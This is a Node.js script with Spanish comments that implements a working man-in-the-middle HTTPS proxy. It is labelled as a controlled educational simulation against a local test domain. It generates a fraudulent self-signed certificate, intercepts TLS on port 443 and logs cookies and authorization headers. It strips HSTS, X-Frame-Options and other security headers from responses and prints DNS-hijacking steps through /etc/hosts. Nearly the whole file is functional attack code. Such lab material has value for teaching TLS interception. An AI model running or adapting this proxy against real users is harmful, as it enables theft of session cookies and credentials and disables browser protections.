/**
 * PROXY MITM REALISTA - Transparent Interception
 * 
 * Este proxy simula un ataque MITM mas cercano a la realidad:
 * - Escucha en puerto 443 (HTTPS estandar)
 * - Funciona con DNS hijacking simulado (/etc/hosts)
 * - Interceptacion transparente (el usuario no cambia puerto)
 * - El navegador cree hablar directamente con el servidor real
 * 
 * REQUIERE: Permisos de administrador (sudo) para puerto 443
 * ADVERTENCIA: Solo para entorno educativo controlado
 */

const https = require('https');
const http = require('http');
const tls = require('tls');
const fs = require('fs');
const { spawn } = require('child_process');

const TARGET_DOMAIN = 'myapp.local'; // Dominio que vamos a interceptar
const REAL_SERVER_PORT = 3000;
const MITM_PORT = 443; // Puerto HTTPS estandar

console.log('PROXY MITM REALISTA - TRANSPARENT INTERCEPTION\n');
console.log('='.repeat(70) + '\n');

// Verificar que existen los certificados del servidor original
const certPath = '../../localhost.pem';
const keyPath = '../../localhost-key.pem';

if (!fs.existsSync(certPath) || !fs.existsSync(keyPath)) {
  console.log('[ERROR] Certificados del servidor no encontrados');
  console.log('Se requieren localhost.pem y localhost-key.pem en el directorio raiz\n');
  process.exit(1);
}

console.log('[PASO 1/3] Generando certificado fraudulento...\n');
console.log(`   Dominio objetivo: ${TARGET_DOMAIN}`);
console.log('   Tipo: Certificado autofirmado (el navegador alertara)\n');

// Generar certificado que coincida con el dominio objetivo
const generateMITMCert = () => {
  return new Promise((resolve, reject) => {
    const genKey = spawn('openssl', [
      'req', '-x509', '-newkey', 'rsa:2048',
      '-keyout', 'mitm-key.pem',
      '-out', 'mitm-cert.pem',
      '-days', '1',
      '-nodes',
      '-subj', `/CN=${TARGET_DOMAIN}/O=Fraudulent CA/C=XX`
    ]);

    genKey.stderr.on('data', () => {}); // Silenciar warnings de openssl

    genKey.on('close', (code) => {
      if (code === 0 && fs.existsSync('mitm-cert.pem')) {
        console.log('   [OK] Certificado MITM generado');
        console.log(`   CN: ${TARGET_DOMAIN} (coincide con dominio objetivo)`);
        console.log('   Emisor: Fraudulent CA (no confiable)\n');
        resolve();
      } else {
        console.log('   [ERROR] No se pudo generar certificado');
        console.log('   Verifica que OpenSSL este instalado\n');
        reject();
      }
    });
  });
};

// Verificar permisos de root para puerto 443
const checkRootPrivileges = () => {
  if (process.getuid && process.getuid() !== 0) {
    console.log('[ADVERTENCIA] Este script necesita privilegios de administrador\n');
    console.log('Puerto 443 requiere permisos root. Ejecuta con:\n');
    console.log('   sudo node mitm-realistic-proxy.js\n');
    console.log('Alternativa: Usar puerto 8443 (no requiere sudo)\n');
    
    // Cambiar a puerto alternativo si no hay permisos
    return 8443;
  }
  return 443;
};

// Iniciar simulacion
generateMITMCert().then(() => {
  const actualPort = checkRootPrivileges();
  
  console.log('[PASO 2/3] Configurando proxy transparente...\n');

  const mitmOptions = {
    key: fs.readFileSync('mitm-key.pem'),
    cert: fs.readFileSync('mitm-cert.pem'),
    // Simular servidor HTTPS profesional
    ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
    honorCipherOrder: true,
    minVersion: 'TLSv1.2'
  };

  let requestCount = 0;
  let bytesIntercepted = 0;
  let sessionsActive = new Set();

  // Crear servidor HTTPS que intercepta transparentemente
  const proxyServer = https.createServer(mitmOptions, (clientReq, clientRes) => {
    requestCount++;
    const reqId = requestCount;
    const clientIP = clientReq.socket.remoteAddress;
    const sessionId = `${clientIP}-${Date.now()}`;
    
    sessionsActive.add(sessionId);

    console.log(`[INTERCEPCION ${reqId}] Conexion entrante`);
    console.log(`   Cliente: ${clientIP}`);
    console.log(`   Metodo: ${clientReq.method} ${clientReq.url}`);
    console.log(`   Host header: ${clientReq.headers.host}`);
    console.log(`   User-Agent: ${clientReq.headers['user-agent']?.substring(0, 50)}...`);
    
    // Detectar si hay datos sensibles
    const hasCookies = !!clientReq.headers.cookie;
    const hasAuth = !!clientReq.headers.authorization;
    
    if (hasCookies) {
      console.log(`   [ALERTA] Cookies detectadas: ${clientReq.headers.cookie.substring(0, 40)}...`);
    }
    if (hasAuth) {
      console.log(`   [ALERTA] Authorization header detectado`);
    }
    console.log('');

    // El proxy ve TODO en claro porque termino el TLS
    console.log(`[ANALISIS ${reqId}] Datos visibles para el atacante:`);
    const headersVisible = Object.keys(clientReq.headers);
    console.log(`   Headers legibles: ${headersVisible.length}`);
    console.log(`   - ${headersVisible.slice(0, 5).join(', ')}${headersVisible.length > 5 ? '...' : ''}`);
    console.log('');

    // Establecer conexion con el servidor REAL
    console.log(`[PROXY ${reqId}] Conectando al servidor real (localhost:${REAL_SERVER_PORT})...\n`);

    const serverOptions = {
      hostname: 'localhost',
      port: REAL_SERVER_PORT,
      path: clientReq.url,
      method: clientReq.method,
      headers: { ...clientReq.headers },
      rejectUnauthorized: false,
    };

    // El proxy puede modificar la peticion antes de reenviarla
    // Ejemplo: Inyectar headers maliciosos
    serverOptions.headers['x-forwarded-for'] = clientIP;
    serverOptions.headers['x-mitm-proxy'] = 'active';

    const serverReq = https.request(serverOptions, (serverRes) => {
      console.log(`[RESPUESTA ${reqId}] Servidor real respondio`);
      console.log(`   Status: ${serverRes.statusCode}`);
      console.log(`   Content-Type: ${serverRes.headers['content-type']}`);
      console.log(`   Content-Length: ${serverRes.headers['content-length'] || 'chunked'}`);
      console.log('');

      // El proxy puede leer y modificar la respuesta
      const modifiedHeaders = { ...serverRes.headers };
      
      // Inyectar headers maliciosos (transparentes para el cliente)
      modifiedHeaders['x-mitm-intercepted'] = 'true';
      modifiedHeaders['x-mitm-timestamp'] = new Date().toISOString();
      modifiedHeaders['x-attacker-id'] = sessionId;

      // Remover headers de seguridad para facilitar otros ataques
      delete modifiedHeaders['strict-transport-security'];
      delete modifiedHeaders['x-frame-options'];
      delete modifiedHeaders['x-content-type-options'];

      console.log(`[MODIFICACION ${reqId}] Alterando respuesta del servidor:`);
      console.log('   + x-mitm-intercepted: true');
      console.log('   + x-mitm-timestamp');
      console.log('   - strict-transport-security (HSTS removido)');
      console.log('   - x-frame-options (proteccion removida)');
      console.log('');

      clientRes.writeHead(serverRes.statusCode, modifiedHeaders);

      let responseData = Buffer.alloc(0);
      
      serverRes.on('data', (chunk) => {
        responseData = Buffer.concat([responseData, chunk]);
        bytesIntercepted += chunk.length;
        
        // El proxy puede modificar el contenido HTML/JS en tiempo real
        // Ejemplo: Inyectar scripts maliciosos
        clientRes.write(chunk);
      });

      serverRes.on('end', () => {
        const contentType = serverRes.headers['content-type'] || '';
        
        console.log(`[CAPTURA ${reqId}] Datos interceptados completamente`);
        console.log(`   Bytes capturados: ${responseData.length}`);
        console.log(`   Tipo: ${contentType}`);
        
        if (contentType.includes('html')) {
          console.log('   [OPORTUNIDAD] HTML detectado - se podria inyectar scripts');
        }
        if (contentType.includes('json')) {
          console.log('   [OPORTUNIDAD] JSON detectado - datos de API legibles');
          try {
            const jsonData = JSON.parse(responseData.toString());
            console.log(`   Keys JSON: ${Object.keys(jsonData).join(', ')}`);
          } catch (e) {
            // No es JSON valido o esta comprimido
          }
        }
        
        console.log('   [EXITO] Cliente recibio respuesta modificada sin detectarlo');
        console.log('');
        
        clientRes.end();
        sessionsActive.delete(sessionId);
      });
    });

    serverReq.on('error', (err) => {
      console.log(`[ERROR ${reqId}] Fallo al conectar con servidor real: ${err.code}\n`);
      clientRes.writeHead(502, { 'Content-Type': 'text/plain' });
      clientRes.end('Bad Gateway - Proxy Error');
      sessionsActive.delete(sessionId);
    });

    // Reenviar body del cliente
    let requestBody = Buffer.alloc(0);
    clientReq.on('data', (chunk) => {
      requestBody = Buffer.concat([requestBody, chunk]);
    });
    
    clientReq.pipe(serverReq);
  });

  // Manejar errores del servidor proxy
  proxyServer.on('error', (err) => {
    if (err.code === 'EACCES') {
      console.log('\n[ERROR FATAL] No hay permisos para puerto 443\n');
      console.log('Soluciones:');
      console.log('1. Ejecutar con sudo: sudo node mitm-realistic-proxy.js');
      console.log('2. Usar puerto alternativo 8443 (editar MITM_PORT en el codigo)\n');
      process.exit(1);
    } else if (err.code === 'EADDRINUSE') {
      console.log(`\n[ERROR] Puerto ${actualPort} ya esta en uso\n`);
      console.log('Ejecuta: sudo lsof -ti:443 | xargs kill -9\n');
      process.exit(1);
    } else {
      console.log(`\n[ERROR] ${err.message}\n`);
      process.exit(1);
    }
  });

  proxyServer.listen(actualPort, () => {
    console.log('[PASO 3/3] Proxy MITM activo y listo\n');
    console.log('='.repeat(70) + '\n');
    console.log(`PROXY TRANSPARENTE ACTIVO EN PUERTO ${actualPort}\n`);
    console.log('CONFIGURACION DEL ATAQUE:\n');
    console.log(`1. Servidor real:     https://localhost:${REAL_SERVER_PORT}`);
    console.log(`2. Proxy MITM:        https://${TARGET_DOMAIN}:${actualPort}`);
    console.log(`3. Certificado MITM:  mitm-realistic-cert.pem\n`);
    
    console.log('INSTRUCCIONES PARA SIMULAR EL ATAQUE:\n');
    console.log('A. Configurar DNS hijacking (simular):');
    console.log('   sudo bash -c "echo \'127.0.0.1 ' + TARGET_DOMAIN + '\' >> /etc/hosts"');
    console.log('');
    console.log('B. Probar con curl:');
    console.log(`   # Cliente vulnerable (acepta cert invalido):`);
    console.log(`   curl -k https://${TARGET_DOMAIN}:${actualPort}`);
    console.log('');
    console.log(`   # Cliente seguro (rechaza cert invalido):`);
    console.log(`   curl https://${TARGET_DOMAIN}:${actualPort}`);
    console.log('   (Fallara: certificate verification failed)\n');
    console.log('');
    console.log('C. Probar con navegador:');
    console.log(`   1. Abre: https://${TARGET_DOMAIN}:${actualPort}`);
    console.log('   2. El navegador mostrara advertencia de seguridad');
    console.log('   3. Si el usuario ignora la advertencia → ATAQUE EXITOSO\n');
    console.log('');
    console.log('D. Limpiar al terminar:');
    console.log('   sudo sed -i \'\' \'/' + TARGET_DOMAIN + '/d\' /etc/hosts');
    console.log('   rm mitm-realistic-*.pem\n');
    console.log('='.repeat(70) + '\n');
    console.log('ESTADISTICAS EN TIEMPO REAL:\n');
    console.log('Presiona Ctrl+C para detener el proxy\n');
  });

  // Estadisticas periodicas
  const statsInterval = setInterval(() => {
    if (requestCount > 0) {
      const kbIntercepted = (bytesIntercepted / 1024).toFixed(2);
      console.log(`[STATS] Peticiones: ${requestCount} | Sesiones activas: ${sessionsActive.size} | Datos capturados: ${kbIntercepted} KB`);
    }
  }, 15000);

  // Limpieza al salir
  process.on('SIGINT', () => {
    clearInterval(statsInterval);
    console.log('\n\n[FINALIZANDO] Deteniendo proxy MITM...\n');
    console.log('='.repeat(70));
    console.log('RESUMEN FINAL DEL ATAQUE:\n');
    console.log(`  Total peticiones interceptadas: ${requestCount}`);
    console.log(`  Total bytes capturados: ${(bytesIntercepted / 1024).toFixed(2)} KB`);
    console.log(`  Sesiones comprometidas: ${requestCount > 0 ? 'SI' : 'NO'}`);
    console.log(`  Duracion: ${process.uptime().toFixed(0)}s`);
    console.log('');
    
    if (bytesIntercepted > 0) {
      console.log('DATOS COMPROMETIDOS:');
      console.log('  - Headers HTTP (incluye cookies, tokens)');
      console.log('  - Contenido HTML/JSON/API responses');
      console.log('  - User agents, IPs, session IDs');
      console.log('  - Cualquier dato enviado/recibido\n');
    }

    // Limpiar certificados generados
    try {
      if (fs.existsSync('mitm-cert.pem')) fs.unlinkSync('mitm-cert.pem');
      if (fs.existsSync('mitm-key.pem')) fs.unlinkSync('mitm-key.pem');
      console.log('[LIMPIEZA] Certificados MITM eliminados\n');
    } catch (e) {
      console.log('[ADVERTENCIA] No se pudieron eliminar certificados\n');
    }

    console.log('RECORDATORIO: Limpia /etc/hosts si agregaste ' + TARGET_DOMAIN);
    console.log('sudo sed -i \'\' \'/' + TARGET_DOMAIN + '/d\' /etc/hosts\n');
    console.log('='.repeat(70) + '\n');

    proxyServer.close();
    process.exit(0);
  });

}).catch(() => {
  console.log('[ABORTADO] No se pudo iniciar el proxy MITM\n');
  process.exit(1);
});
